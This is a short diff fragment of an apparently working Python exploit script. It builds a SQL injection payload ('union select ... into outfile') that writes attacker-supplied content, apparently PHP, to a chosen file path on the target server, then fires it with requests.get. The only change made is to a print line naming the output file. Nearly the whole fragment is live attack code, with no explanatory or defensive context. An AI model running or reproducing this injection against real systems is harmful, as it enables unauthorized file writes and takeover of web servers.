@@ -33,7 +33,7 @@ header = {
 query = urllib.quote("1')) union select 1,2,'%s' into outfile '%s';-- " % (phpinfo, sys.argv[1]))
 target = url + query
 print("[*] Query: %s" % query)
-print("[*] Creating: %s" % "/tmp/proof.txt")
+print("[*] Creating: %s" % sys.argv[1])
 res = requests.get(target, headers=header, verify=False)
 
 print("[*] SUCCESS?")
